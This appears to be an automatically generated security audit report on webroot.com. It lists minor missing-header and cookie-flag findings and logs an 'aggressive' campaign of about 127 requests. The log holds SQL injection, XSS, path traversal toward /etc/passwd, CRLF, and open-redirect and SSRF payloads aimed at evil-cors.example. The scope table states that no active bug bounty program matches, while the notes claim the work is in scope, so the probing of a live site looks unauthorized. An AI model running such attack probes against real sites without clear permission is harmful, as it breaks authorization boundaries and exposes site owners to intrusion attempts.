# Security Audit Report - webroot.com

## Scope and authorization

| Item | Value |
|---|---|
| Target | https://webroot.com/ |
| Bug bounty program | [top-websites gist (no active program match)]() |
| Listed scope domain | webroot.com |
| Test date | 2026-09-24 09:40 UTC |
| Method | Non-destructive passive/active probing (GET requests only, no forms submitted, no auth) |

## Summary

Total findings: **20** (High: 0, Medium: 0, Low: 16, Info: 4)

| # | Severity | ID | Finding | CWE |
|---|---|---|---|---|
| 1 | low | C1 | Cookie without Secure flag | CWE-614 |
| 2 | low | C1 | Cookie without Secure flag | CWE-614 |
| 3 | low | C1 | Cookie without Secure flag | CWE-614 |
| 4 | low | C1 | Cookie without Secure flag | CWE-614 |
| 5 | low | C1 | Cookie without Secure flag | CWE-614 |
| 6 | low | C1 | Cookie without Secure flag | CWE-614 |
| 7 | low | C1 | Cookie without Secure flag | CWE-614 |
| 8 | low | C2 | Cookie without HttpOnly flag | CWE-1004 |
| 9 | low | C2 | Cookie without HttpOnly flag | CWE-1004 |
| 10 | low | H1 | Missing HSTS header | CWE-319 |
| 11 | low | H2 | Missing CSP header | CWE-1021 |
| 12 | low | H2 | Missing CSP header | CWE-1021 |
| 13 | low | H3 | Missing X-Content-Type-Options | CWE-1194 |
| 14 | low | H3 | Missing X-Content-Type-Options | CWE-1194 |
| 15 | low | H4 | No clickjacking protection | CWE-1023 |
| 16 | low | H4 | No clickjacking protection | CWE-1023 |
| 17 | info | H5 | Missing Referrer-Policy | CWE-200 |
| 18 | info | H5 | Missing Referrer-Policy | CWE-200 |
| 19 | info | H6 | Server technology disclosure | CWE-200 |
| 20 | info | H6 | Server technology disclosure | CWE-200 |

## Detailed findings

### 1. [LOW] Cookie without Secure flag (`C1`)

- **CWE:** CWE-614
- **Detail:** Cookie SSID lacks Secure attribute; transmitted over HTTP.
- **Context:** http response
- **Recommendation:** Add the Secure attribute to the cookie.

### 2. [LOW] Cookie without Secure flag (`C1`)

- **CWE:** CWE-614
- **Detail:** Cookie SSSC lacks Secure attribute; transmitted over HTTP.
- **Context:** http response
- **Recommendation:** Add the Secure attribute to the cookie.

### 3. [LOW] Cookie without Secure flag (`C1`)

- **CWE:** CWE-614
- **Detail:** Cookie SSRT lacks Secure attribute; transmitted over HTTP.
- **Context:** http response
- **Recommendation:** Add the Secure attribute to the cookie.

### 4. [LOW] Cookie without Secure flag (`C1`)

- **CWE:** CWE-614
- **Detail:** Cookie visid_incap_3211517 lacks Secure attribute; transmitted over HTTP.
- **Context:** http response
- **Recommendation:** Add the Secure attribute to the cookie.

### 5. [LOW] Cookie without Secure flag (`C1`)

- **CWE:** CWE-614
- **Detail:** Cookie incap_ses_176_3211517 lacks Secure attribute; transmitted over HTTP.
- **Context:** http response
- **Recommendation:** Add the Secure attribute to the cookie.

### 6. [LOW] Cookie without Secure flag (`C1`)

- **CWE:** CWE-614
- **Detail:** Cookie visid_incap_3211517 lacks Secure attribute; transmitted over HTTP.
- **Recommendation:** Add the Secure attribute to the cookie.

### 7. [LOW] Cookie without Secure flag (`C1`)

- **CWE:** CWE-614
- **Detail:** Cookie incap_ses_176_3211517 lacks Secure attribute; transmitted over HTTP.
- **Recommendation:** Add the Secure attribute to the cookie.

### 8. [LOW] Cookie without HttpOnly flag (`C2`)

- **CWE:** CWE-1004
- **Detail:** Cookie incap_ses_176_3211517 lacks HttpOnly; readable by client-side JS.
- **Context:** http response
- **Recommendation:** Add the HttpOnly attribute to the cookie.

### 9. [LOW] Cookie without HttpOnly flag (`C2`)

- **CWE:** CWE-1004
- **Detail:** Cookie incap_ses_176_3211517 lacks HttpOnly; readable by client-side JS.
- **Recommendation:** Add the HttpOnly attribute to the cookie.

### 10. [LOW] Missing HSTS header (`H1`)

- **CWE:** CWE-319
- **Detail:** No Strict-Transport-Security header present. Browsers do not enforce HTTPS for repeat visits.
- **Context:** http response
- **Recommendation:** Add Strict-Transport-Security with max-age >= 31536000 and preload.

### 11. [LOW] Missing CSP header (`H2`)

- **CWE:** CWE-1021
- **Detail:** No Content-Security-Policy header. XSS mitigation relies solely on output encoding.
- **Context:** http response
- **Recommendation:** Add a Content-Security-Policy header (start with default-src and report-only).

### 12. [LOW] Missing CSP header (`H2`)

- **CWE:** CWE-1021
- **Detail:** No Content-Security-Policy header. XSS mitigation relies solely on output encoding.
- **Recommendation:** Add a Content-Security-Policy header (start with default-src and report-only).

### 13. [LOW] Missing X-Content-Type-Options (`H3`)

- **CWE:** CWE-1194
- **Detail:** No nosniff directive; browsers may MIME-sniff responses.
- **Context:** http response
- **Recommendation:** Set X-Content-Type-Options: nosniff.

### 14. [LOW] Missing X-Content-Type-Options (`H3`)

- **CWE:** CWE-1194
- **Detail:** No nosniff directive; browsers may MIME-sniff responses.
- **Recommendation:** Set X-Content-Type-Options: nosniff.

### 15. [LOW] No clickjacking protection (`H4`)

- **CWE:** CWE-1023
- **Detail:** No X-Frame-Options or CSP frame-ancestors; page can be embedded in a frame.
- **Context:** http response
- **Recommendation:** Set X-Frame-Options: DENY/SAMEORIGIN or CSP frame-ancestors.

### 16. [LOW] No clickjacking protection (`H4`)

- **CWE:** CWE-1023
- **Detail:** No X-Frame-Options or CSP frame-ancestors; page can be embedded in a frame.
- **Recommendation:** Set X-Frame-Options: DENY/SAMEORIGIN or CSP frame-ancestors.

### 17. [INFO] Missing Referrer-Policy (`H5`)

- **CWE:** CWE-200
- **Detail:** No Referrer-Policy header; full URL may leak to third-party referrers.
- **Context:** http response
- **Recommendation:** Set Referrer-Policy (e.g., strict-origin-when-cross-origin).

### 18. [INFO] Missing Referrer-Policy (`H5`)

- **CWE:** CWE-200
- **Detail:** No Referrer-Policy header; full URL may leak to third-party referrers.
- **Recommendation:** Set Referrer-Policy (e.g., strict-origin-when-cross-origin).

### 19. [INFO] Server technology disclosure (`H6`)

- **CWE:** CWE-200
- **Detail:** Server header reveals: Vercel
- **Context:** http response
- **Recommendation:** Consider hiding or shortening the Server header.

### 20. [INFO] Server technology disclosure (`H6`)

- **CWE:** CWE-200
- **Detail:** Server header reveals: Vercel
- **Recommendation:** Consider hiding or shortening the Server header.

## Aggressive probe campaign

**Stage 1 - injection/reflection probes (28 requests):**

- no stage-1 probe hits (all probes negative)

**Stage 2 - aggressive probe suite v2 (99 requests):**

- no stage-2 probe hits (all probes negative)

Stage-2 probe log (observed responses):
- timing base=472ms id=452 search=449
- boolean b=302/122 t1=302/122 t2=302/122
- graphql /graphql -> 302
- graphql /api/graphql -> 302
- trav2 /%252e%252e/%252e%252e/%252e%252e/%252e% -> 302
- trav2 /..%255c..%255c..%255c..%255c..%255c..%2 -> 302
- trav2 /%2e%2e%00.html -> 302
- trav2 /static//../../../../../../etc/passwd -> 302
- trav2 /..%c0%af..%c0%af..%c0%af..%c0%af/etc/pa -> 302
- hpp /?q=1&q=%3Cscript%3Ealert(1)%3C%2Fscript%3E -> 302
- hpp /search?q=1&q=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E -> 302
- xss2 /?q=%22%3E%3Csvg%2Fonload%3Dalert(1)%3E -> 302
- xss2 /?q=%27%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E -> 302
- apicors /api -> 302
- apicors /api/v1 -> 302
- apicors /graphql -> 302
- apicors /rest -> 302
- apicors /v1 -> 302

## Evidence (raw response observations)

```json
{
  "http_status": 308,
  "http_redirect_to": "https://webroot.com/",
  "https_status": 307,
  "content_type": "text/plain",
  "title": "",
  "path_gitconfig": 403,
  "path_envfile": 403,
  "path_securitytxt": 307,
  "path_robots": 307,
  "probe_count": 28,
  "probe_log": [
    "sqli /search?q=1%27+OR+1=1-- -> 403",
    "sqli /?id=1%27+OR+1=1-- -> 403",
    "sqli /?q=%27 -> 302",
    "sqli /products?filter=%27 -> 302",
    "sqli /?p=1;-- -> 302",
    "sqli-reflect /search?q=%27+OR+1=1-- -> 302",
    "xss /?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E -> 302",
    "xss /search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E -> 302",
    "xss /search?query=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E -> 302",
    "xss /?id=%3Csvg%20onload%3Dalert(1)%3E -> 302",
    "xss /search?term=%3Cscript%3Ealert(1)%3C%2Fscript%3E -> 302",
    "trav /..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd -> 302",
    "trav /static/../../../../../../../../etc/passwd -> 302",
    "trav /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd -> 302",
    "trav /..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini -> 302",
    "redir /redirect?url=https%3A%2F%2Fevil-cors.example%2Fx -> 302",
    "redir /redirect?next=https%3A%2F%2Fevil-cors.example%2Fx -> 302",
    "redir /?next=https%3A%2F%2Fevil-cors.example%2Fx -> 302",
    "redir /go?url=https%3A%2F%2Fevil-cors.example%2Fx -> 302",
    "redir /url?url=https%3A%2F%2Fevil-cors.example%2Fx -> 302",
    "redir /out?url=https%3A%2F%2Fevil-cors.example%2Fx -> 302",
    "crlf /?q=a%0d%0aX-Inj:%201 -> 302",
    "crlf /search?q=a%0d%0aX-Inj:%201 -> 302",
    "host no reflection -> err",
    "ssrf /api/preview?url=https%3A%2F%2Fevil-cors.example%2Fx -> 302",
    "ssrf /preview?url=https%3A%2F%2Fevil-cors.example%2Fx -> 302",
    "ssrf /proxy?u=https%3A%2F%2Fevil-cors.example%2Fx -> 302",
    "ssrf /fetch?url=https%3A%2F%2Fevil-cors.example%2Fx -> 302"
  ],
  "v2_probe_count": 99,
  "v2_log": [
    "timing base=472ms id=452 search=449",
    "boolean b=302/122 t1=302/122 t2=302/122",
    "graphql /graphql -> 302",
    "graphql /api/graphql -> 302",
    "sweep no hits over 26 paths",
    "trav2 /%252e%252e/%252e%252e/%252e%252e/%252e% -> 302",
    "trav2 /..%255c..%255c..%255c..%255c..%255c..%2 -> 302",
    "trav2 /%2e%2e%00.html -> 302",
    "trav2 /static//../../../../../../etc/passwd -> 302",
    "trav2 /..%c0%af..%c0%af..%c0%af..%c0%af/etc/pa -> 302",
    "hpp /?q=1&q=%3Cscript%3Ealert(1)%3C%2Fscript%3E -> 302",
    "hpp /search?q=1&q=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E -> 302",
    "xss2 /?q=%22%3E%3Csvg%2Fonload%3Dalert(1)%3E -> 302",
    "xss2 /?q=%27%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E -> 302",
    "redir2 no hits over 49 requests",
    "apicors /api -> 302",
    "apicors /api/v1 -> 302",
    "apicors /graphql -> 302",
    "apicors /rest -> 302",
    "apicors /v1 -> 302"
  ]
}
```

## Notes

- All tests used a standard browser User-Agent; each site was probed with a two-stage aggressive GET-only suite (passive/header checks plus stage-1 and stage-2 injection, XSS, traversal, CORS and redirect probes, up to ~100 requests per site).
- No credentials were used; no state was modified on the target.
- Findings are reported against the public program scope; submission through the program tracker is pending.
